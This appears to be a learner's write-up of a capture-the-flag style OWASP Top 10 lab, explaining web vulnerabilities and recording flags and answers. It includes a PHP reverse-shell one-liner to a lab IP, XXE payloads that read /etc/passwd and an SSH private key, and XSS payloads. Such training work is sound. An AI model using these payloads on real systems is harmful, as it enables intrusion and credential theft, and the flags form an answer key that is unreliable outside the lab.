# OWASP Top 10

## Injection [Severity 1]

Injection flaws are surprisingly common in applications today. They occur when user controlled input is interpreted by the software to be a legitimate command. Common types of injection include SQL injection and command injection.

A successful SQL injection would allow the attacker into the database, meaning they can access, modify or delete information that is stored. They will likely gain access to users passwords.

A successful command injection could allow an attacker to gain access to either the servers system or other users systems.

The main defences for these forms of injection are to use an allow list - the input given must be marked as safe before it is processed, or to strip the input of any characters that may be deemed dangerous.

### OS command injection

Command Injection occurs when server-side code in a web application makes a system call on the hosting machine. This allows the attacker to run operating system command on the server. Ideally as an attacker, this would be used in order to attempt to spawn a reverse shell to become the user that the web server is running as.

### Command injection practical

Blind command injection occurs whenthe system command made to the server does not return the response to the user in the HTML document. Active command injection will show the response.

Load a website that is vulnerable to this issue

**Questions**

Let's get a reverse shell first.

php -r '$sock=fsockopen("10.9.5.200",4444);exec("/bin/sh -i <&3 >&3 2>&3");'


	1. What strange text file is in the website root directory?

drpepper.txt

	2. How many non-root/non-service/non-daemon users are there?

0

	3. What user is this app running as?

www-data

	4. What is the user's shell set as?

usr/sbin/nologin

	5. What version of Ubuntu is running?

18.04.4

	6. Print out the MOTD.  What favorite beverage is shown?

Dr Pepper

## Broken Authentication [Severity 2]

Authentication and session management are core components of modern web applications. The most common form of authentication is a username and password mechanism. A user will enter them, the server will validate them and send them a session cookie so that the server can keep track of the users actions.

If an attacker finds a flaw in the authentication mechanism, they could gain access to other users accounts which naturally allows the attacker to have access to sensitive data. Flaws in authentication mechanisms include:

* Brute Force Attacks - If the web app uses usernames and passwords, an attacker is able to attempt to guess these
* Use of weak credentials - Web applications should set strong password policies, an attacker may use a dictionary of common usernames and passwords to attempt to gain access.
* Weak Session Cookies - If a session cookie contains predictable values an attacker can create their own session cookie and become another user.

Mitigation strategies include:

* Have a strong password policy
* Have the application perform an automatic lockout for a while after a certain amount of failed attempts.
* Multi Factor Authentication also improves security

### Broken Authentication Practical

Often, developers can forget to sanitize the inputs given by a user making them vulnerable to SQL injection. In this practical we will be looking at a vuilnerability that allows for re-registration of an existing user. In this case the programmer we will try to create a user darren, but will quickly find out this user already exists. Instead we will create a user called " darren" who in theory should have access to the original darren's data.

**Questions**

	1. What is the flag that you found in darren's account?

fe86079416a21a3c99937fea8874b667

Now try to do the same trick and see if you can login as arthur.

Create an account with username "arthur "

	2. What is the flag that you found in arthur's account?

d9ac0f7db4fda460ac3edeb75d75e16e

## Sensitive Data Exposure [Severity 3]

When a webapp accidentally divulges sensitive data, we refer to it as Sensitive Data Exposure. Often this is data related to customers but can also be things such as usernames and passwords.

At more complex levels this can involve techniques such as a Man in the Middle attack, when the attacker will force connections through a device they control and attempt to gain access to the intercepted information.

The most common way to store a large amount of data in a format that can easily be accessed from many locations is in a database. Databases generally use SQL syntax however alternative formats are rising in popularity.

Often databases are set up on a server, however for the task at hand we will be looking databases stored as files (flat-file databases). These are potentially seen in smaller web applications.

Flat file databases are stored as files on a computer. Usually this is not an issue for a webapp, however if the database is stored under the root directory of the website, we can download it and query it on our own machine.

The most common format of flat-file database is an sqlite database. These databases can be interacted with in most programming languages and have a dedicated client (sqlite3) for querying them on the command line.

Downloaded databases can be interacted with sqlite3 (database_name)

Tables can be viewed with the .tables command.

PRAGMA command can be used to find more information about a table.

Select * from table_name; will dump the contents of the table.

Crackstation is an online tool used for cracking passwords.

## Senstitve Data Exposure - Challenge

Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory.

**Questions**

	1. What is the namee of the mentioned directory?

/assets (note gobuster needed to be used to locate this)

	2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

webapp.db

	3. Use the supporting material to access the sensitive data. What is the password hash of the admin user?

THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

	4. Crack the hash. What is the admin's plaintext password?

qwertyuiop

	5. Login as the admin. What is the flag?

THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## XML External Entity [Severity 4]

An XML external entity attack is a vulnerability that abuses features of XML parsers/data. This can allow an attacker access to the back end or other external systems that the application can access.

There are two types of XXE attacks:

* In band - where the attacker receives an immediate response to the XXE payload
* Out of band (Blind) - where there is no immediate response from the web application and the attacker has to reflect the output of their XXE payload to another file/server.

### eXtensible Markup Language

XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.

* XML is platform and programming language independent and it can be used on any system and is supportive of future technology chhanges
* Data stored and transported using XML can be changed at any point without affecting the data presentation
* XLM allows validation using DTD and Schema. Documents should be free from syntax errors.


XML documents should start with XML Prolog which will specify the version and encoding used

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Every XML document must contain a ROOT element. If it doesn't contain this then it would be considered 'wrong' or 'invalid'

XML is a case sensitive language

Similarly to HTML, attributes can be used and the syntax is very similar.

**Questions**

	1. Full form of XML

eXtensible Markup Language

	2. Is it compulsory to have XML prolog in XML documents?

No (but it is strongly recommended)

	3. Can we validate XML documents against a schema?

Yes

	4. How can we specify XML version and encoding in XML document?

XML Prolog

### DTD

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

* An XML document with correct syntax is called "Well Formed".
* An XML document validated against a DTD is both "Well Formed" and "Valid".

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

```xml
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

Here is how the DTD valaidates the XML:

* !DOCTYPE note -  Defines a root element of the document named note
* !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
* !ELEMENT to - Defines the 'to' element to be of type "#PCDATA"
* !ELEMENT from - Defines the 'from' element to be of type "#PCDATA"
* !ELEMENT heading  - Defines the 'heading' element to be of type "#PCDATA"
* !ELEMENT body - Defines the 'body' element to be of type "#PCDATA"

\#PCDATA means parseable character data

**Questions**

	1. How do you define a new ELEMENT?

!ELEMENT

	2. How do you define a ROOT element?

!DOCTYPE

	3. How do you define a new ENTITY?

!ENTITY

### XXE Payload

We can create our own payloads, in this example we will attempt to use the SYSTEM keyword in order to retrive the contents of /etc/passwd.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

This kind of payload can be used to attempt to read files, however this can often fail.

### Exploiting

**Questions**

	1. Try to display your own name using any payload.

```xml
<!DOCTYPE name>
 <userInfo>
  <firstName>Gabriel</firstName>
  <lastName>Cullen</lastName>
 </userInfo>
 ```

	2. See if you can read the /etc/passwd

Exploit shown above

	3. What is the name of the user in /etc/passwd

falcon

	4. Where is falcon's SSH key located?

/home/falcon/.ssh/id_rsa (this is just the default location)

	5. What are the first 18 characters for falcon's private key

MIIEogIBAAKCAQEA7b

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

## Broken Access Control [Severity 5]

Websites contain pages that are protected from regular visitors, such as administrator pages, if a visitor is able to view pages they are not supposed to then the access controls are broken.

A regular visitor being able to access protected pages can lead to the following:
* Being able to view sensitive information
* Accessing unauthorised functionality

Can manually modify URL with relevant parameters. Brute forcing URL's may also work

### IDOR Challenge

Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you normally would not be able to access.

If you have a URL like http://10.10.97.41/note.php?note=1 it may be possible to view other notes by changing the value of the note like so - http://10.10.97.41/note.php?note=2

**Questions**

	1. Look at other users notes. What is the flag?

flag{fivefourthree}

## Security Misconfiguration [Severity 6]

Security misconfigurations occur whhen security could have been configured properly but was not.

These include:

* Poorly configured permissions on cloud services
* Having unnecessary features enabled
* Default accounts with unchanged passwords
* Error messages that provide too much detail to an attacker
* Not using HTTP security headers

These vulnerabilities often lead to more vulnerabilities.

Given a web service, it is always worth checking to see if any default credentials allow access

**Questions**

	1. Hack into the webapp, and find the flag!

thm{4b9513968fd564a87b28aa1f9d672e17}

Found by performing a google search for "Pensive Notes Default Credentials"

## Cross-site Scripting [Severity 7]

Cross site scripting is a security vulnerability typicaally found in web applications. A web application is vulnerable to XSS is it used unsianitized user input.

XSS is possible in:

* Javascript
* Visual Basic Script
* Flash
* CSS

There are three main types of cross-site scripting:

* Stored XSS - This is where a malicious string originates from the website's database. This usually happes when a website allows unsanitised input to be inserted into the database.
* Reflected XSS - The malicious payload is part of the victims request to the website. The website includes a payload in the response to the user.
* DOM-Based XSS - Document Object Model is a programming interface for HTML and XML documents.

Common payloads include:

* Popups
* Writing HTML
* Keyloggers
* Port Scanning

**Questions**

	1. Navigate to http://IP in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

ThereIsMoreToXSSThanYouThink

```js
<script>alert("Hello")</script>
```

	2. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

ReflectiveXss4TheWin

```js
<script>alert(window.location.hostname)</script>
```

	3. Then add a comment and see if you can insert some of your own HTML.

HTML_T4gs

	4. On the same page, create an alert popup box appear on the page with your document cookies.

W3LL_D0N3_LVL2

	5. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

websites_can_be_easily_defaced_with_xss

```js
document.getElementById('thm-title').innerHTML="I am a hacker";
```

## Insecure Deserialization

"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" - replacing data processed by an application with malicious code. Can be used for anything from DoS attacks to Remote Code Execution.

Any application that stores/fetches data where there are no validations in place for the data could be vulnerable.

**Questions**

	1. Who developed the Tomcat application?

The Apache Software Foundation

	2. What type of attack that crashes services can be performed with insecure deserialization?

Denial of Service

### Objects

In object oriented programming, objects are made up of two things, states and behaviours.

A lamp can have different types of bulbs, this would be the state and it can be on or off, it's behaviours.

**Questions**

	1. if a dog was sleeping, would this be:

A Behaviour

### Deserialization

Serialisation is the process of converting objects used in programming into simpler, compatiblee formatting for transmitting between systems or networks for further processing or storage. Deserialisation is the reverse of this.

Insecure Deserialization occurs when data from an untrusted party gets executed because there is no filtering or validation. The system will assume the data is trustworthy and execute it.

**Questions**

	1. What is the name of the base-2 formatting that data is sent across a network as? 

Binary

### Cookies

Cookies are tiny pieces of data that are created by a website and stored on the users computer. Used to store user specific information, they are not permanant storage solutions. Some cookies will close when the browser has been exited, others last longer, through an expirt timer that is set when the cookie is created.

**Questions**

	1. If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

webapp.com/login

	2. What is the acronym for the web technology that Secure cookies work over?

HTTPS

### Cookies Practical

**Questions**

	1. 1st flag (cookie value)

THM{good_old_base64_huh}

	2. 2nd flag (admin dashboard)

THM{heres_the_admin_flag}

### Code Execution

THM{compl3ted_the_quiz}

RCE Flag = 4a69a7ff9fd68

## Components with Known Vulnerabilities - Intro

Occasionally it is possible that the entity that is being attacked is using a program with a well documented vulnerability.

Exploit-db is a good place to look for exploits of old versions of software.

### Practical

Examine the website. Originally I saw some fields so attempted to use sqlmap

Nothing interesting found

Gobuster returned some interesting directories like /database

Further examination led me to an exploit found on exploit-db  (https://www.exploit-db.com/exploits/47887 )

Downloading this and modifying slightly allowed me to obtain a reverse shell for this account.

**Questions**

	1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

1611

## Insufficient Logging and Monitoring


When web applications are set up, every action performed by the user should be logged. This way an attackers actions can be traced. Once their actions are traced, their risk and impact can be determined, and we can know what the attacker was able to access. 

Information Stored in logs should include

* HTTP status codes
* Time stamps
* Usernames
* API endpoints/ page locations
* IP addresses

As logs often contain sensitive information it is important to ensure that they are stored securely and that multiple copies are stored at different locations.

Logging is important after a breach has taken place, however the company should have monitoring in place to detect any suspicious activity.

Supicious activity may include:

* Multiple unauthorised attepts for a particular action
* Requests from anomalous IP addresses or locations 
* Use of automated tools
* Common payloads 

Detecting suspicious activity and rating it allows higher impact actions to be responded to sooner.

**Questions**

	1. What IP address is the attacker using?

49.99.13.16

	2. What kind of attack is being carried out?

brute force